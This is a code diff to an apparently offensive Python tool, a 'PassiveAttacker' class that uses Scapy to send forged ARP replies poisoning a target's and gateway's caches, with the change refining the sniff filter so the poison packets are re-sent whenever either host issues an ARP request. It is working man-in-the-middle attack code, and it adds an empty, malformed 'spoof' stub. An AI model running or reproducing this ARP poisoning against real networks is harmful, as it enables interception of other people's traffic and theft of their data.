@@ -187,7 +187,14 @@ class PassiveAttacker:
         arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
         poison_gateway = ether2 / arp2
         packet = (poison_gateway, poison_target)
-        sniff(filter=f'host {arper.target} and arp', prn=lambda _: sendp(packet), store=0)
+        bpf_filter = (
+            f"(src host {arper.target} or src host {arper.gateway}) "
+            f"and arp and arp[6:2] = 1"
+        )
+        sniff(filter=bpf_filter, prn=lambda _: sendp(packet), store=0)
+
+    def spoof(packet, poison):
+        pass
 
     def sniff_and_store(self, arper: Arper, poison_process: Process):
         print(f'Sniffing {arper.count} packets')
